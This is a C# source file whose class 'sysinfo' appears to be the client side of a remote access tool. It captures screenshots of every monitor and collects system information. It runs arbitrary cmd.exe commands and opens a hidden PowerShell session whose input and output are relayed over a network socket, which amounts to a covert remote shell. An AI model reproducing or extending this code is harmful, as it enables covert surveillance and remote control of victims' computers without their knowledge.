using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing.Imaging;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;
using System;

class sysinfo
{
    public List<Dictionary<string, object>> GetScreenInfo()
    {
        List<Dictionary<string, object>> screenInfo = new List<Dictionary<string, object>>();

        Screen[] screens = Screen.AllScreens;

        for (int i = 0; i < screens.Length; i++)
        {
            var monitor = screens[i];
            var monitorInfo = new Dictionary<string, object>
        {
            { "size", new Tuple<int, int>(monitor.Bounds.Width, monitor.Bounds.Height) },
            { "resolution", new Tuple<int, int>(monitor.Bounds.Width, monitor.Bounds.Height) },
            { "position", new Tuple<int, int>(monitor.Bounds.X, monitor.Bounds.Y) },
            { "len_monitors", screens.Length }
        };
            screenInfo.Add(monitorInfo);
        }

        return screenInfo;
    }

    public void StartInteractiveCommandPrompt(Socket socket)
    {
        program progA = new program();
        Process cmdProcess = new Process();

        // Configure the process to run cmd.exe
        cmdProcess.StartInfo.FileName = "powershell.exe";
        cmdProcess.StartInfo.UseShellExecute = false;
        cmdProcess.StartInfo.RedirectStandardInput = true;
        cmdProcess.StartInfo.RedirectStandardOutput = true;
        cmdProcess.StartInfo.RedirectStandardError = true;
        cmdProcess.StartInfo.CreateNoWindow = true;

        // Subscribe to the OutputDataReceived event with arguments using a lambda expression
        cmdProcess.OutputDataReceived += (sender, e) => OutputHandler(sender, e, socket);

        // Subscribe to the ErrorDataReceived event with arguments using a lambda expression
        cmdProcess.ErrorDataReceived += (sender, e) => ErrorHandler(sender, e, socket);

        // Start the process
        cmdProcess.Start();

        // Begin asynchronous output/error reading
        cmdProcess.BeginOutputReadLine();
        cmdProcess.BeginErrorReadLine();

        // Create a StreamWriter to send commands to the cmd process
        StreamWriter cmdWriter = cmdProcess.StandardInput;

        // Continuously read user input and send it to the cmd process
        while (GlobalVariables.iscommand)
        {
            if (GlobalVariables.command.Length > 0)
            {
                if (string.IsNullOrEmpty(GlobalVariables.command))
                    break;
                cmdWriter.WriteLine(GlobalVariables.command);
                GlobalVariables.command = "";
            }
            if (cmdProcess.HasExited)
            {
                // Process has terminated, break out of the loop
                program.SendData(socket, Encoding.UTF8.GetBytes("STOPCMD"));
                GlobalVariables.iscommand = false;
                break;
            }

        }
        Console.WriteLine("DISCONNECTED FROM CMD");
        // Close the input stream to signal the end of input
        cmdWriter.Close();

        // Wait for the process to exit
        cmdProcess.WaitForExit();

        // Clean up resources
        cmdProcess.Close();
    }

    static void OutputHandler(object sender, DataReceivedEventArgs e, Socket socket)
    {
        if (!string.IsNullOrEmpty(e.Data))
        {
            byte[] data = Encoding.UTF8.GetBytes("cmd->" + e.Data);
            program.SendData(socket, data);
        }
    }

    static void ErrorHandler(object sender, DataReceivedEventArgs e, Socket socket)
    {
        if (!string.IsNullOrEmpty(e.Data))
        {
            byte[] data = Encoding.UTF8.GetBytes("cmd->" + e.Data);
            program.SendData(socket, data);
        }
    }
    public Dictionary<string, string> GetSystemInfo(string[] keywords)
    {
        Dictionary<string, string> json_data = new Dictionary<string, string>();

        foreach (string keyword in keywords)
        {
            json_data[keyword] = "Unknown";
        }

        Process process = new Process
        {
            StartInfo = new ProcessStartInfo
            {
                FileName = "systeminfo",
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true
            }
        };

        process.Start();
        string output = process.StandardOutput.ReadToEnd();
        process.WaitForExit();

        string[] lines = output.Split('\n');

        foreach (string line in lines)
        {
            foreach (string keyword in keywords)
            {
                if (line.Contains(keyword))
                {
                    string[] parts = line.Split(':');
                    if (parts.Length >= 2)
                    {
                        string info = parts[1].Trim();
                        json_data[keyword] = info;
                        break;
                    }
                }
            }
        }

        return json_data;
    }
    public string get_contents(string command, int line)
    {

        Process process = new Process
        {
            StartInfo = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                RedirectStandardInput = true,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true,
                Arguments = $"/c {command}"
            }
        };

        process.Start();
        string output = process.StandardOutput.ReadToEnd();
        string error = process.StandardError.ReadToEnd();
        process.WaitForExit();

        if (!string.IsNullOrWhiteSpace(error))
        {
            return error;
        }
        else if (!string.IsNullOrWhiteSpace(output))
        {
            string[] contents = output.Trim().Split('\n');
            return contents[line];
        }
        else
        {
            return null;
        }
    }
    public byte[] BitmapToBytes(Bitmap bitmap, ImageFormat format, long quality)
    {
        // Set up the encoder parameter for quality
        System.Drawing.Imaging.EncoderParameter qualityParam = new System.Drawing.Imaging.EncoderParameter(System.Drawing.Imaging.Encoder.Quality, quality);

        // Set up the encoder parameters
        System.Drawing.Imaging.EncoderParameters encoderParams = new System.Drawing.Imaging.EncoderParameters(1);
        encoderParams.Param[0] = qualityParam;
        using (MemoryStream stream = new MemoryStream())
        {
            ImageCodecInfo jpegCodec = GetEncoderInfo(format);
            bitmap.Save(stream, jpegCodec, encoderParams);

            return stream.ToArray();
        }
    }
    public Bitmap CaptureScreen(int monitorIndex)
    {
        if (monitorIndex < 0 || monitorIndex >= Screen.AllScreens.Length)
        {
            throw new ArgumentOutOfRangeException(nameof(monitorIndex), "Invalid monitor index");
        }

        Rectangle screenBounds = Screen.AllScreens[monitorIndex].Bounds;
        Bitmap screenshot = new Bitmap(screenBounds.Width, screenBounds.Height);
        using (Graphics graphics = Graphics.FromImage(screenshot))
        {
            graphics.CopyFromScreen(screenBounds.Location, Point.Empty, screenBounds.Size);
        }

        return screenshot;
    }

    static ImageCodecInfo GetEncoderInfo(ImageFormat format)
    {
        ImageCodecInfo[] codecs = ImageCodecInfo.GetImageEncoders();
        foreach (ImageCodecInfo codec in codecs)
        {
            if (codec.FormatID == format.Guid) { return codec; }
        }
        return null;
    }

}